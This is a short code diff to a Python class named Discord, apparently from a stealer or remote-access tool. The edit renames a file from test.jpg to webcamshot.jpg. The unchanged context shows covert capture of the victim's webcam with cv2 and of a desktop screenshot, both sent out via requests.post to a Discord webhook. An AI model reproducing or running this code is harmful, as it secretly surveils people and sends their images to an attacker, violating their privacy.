@@ -513,7 +513,7 @@ class Discord:
 
         camera = cv2.VideoCapture(0)
         return_value, image = camera.read()
-        cv2.imwrite(temp_path + "\\test.jpg", image)
+        cv2.imwrite(temp_path + "\\webcamshot.jpg", image)
         camera.release()
         cv2.destroyAllWindows()
 
@@ -532,7 +532,7 @@ class Discord:
                     "color": 5639644,
                     "title": "",
                     "image": {
-                        "url": "attachment://test.jpg"
+                        "url": "attachment://webcamshot.jpg"
                     }
                 }
             ]
@@ -541,7 +541,7 @@ class Discord:
         with open(temp_path + "\\desktopshot.png", "rb") as f:
             image_data = f.read()
 
-        with open(temp_path + "\\test.jpg", "rb") as i:
+        with open(temp_path + "\\webcamshot.jpg", "rb") as i:
             test_data = i.read()
 
         desktop_encoder = MultipartEncoder({
@@ -553,7 +553,7 @@ class Discord:
 
         test_encoder = MultipartEncoder({
             'payload_json': json.dumps(webhook_data),
-            'file': ('test.jpg', test_data, 'image/png')
+            'file': ('webcamshot.jpg', test_data, 'image/png')
         })
         requests.post(webhook, headers={
                       'Content-type': test_encoder.content_type}, data=test_encoder)
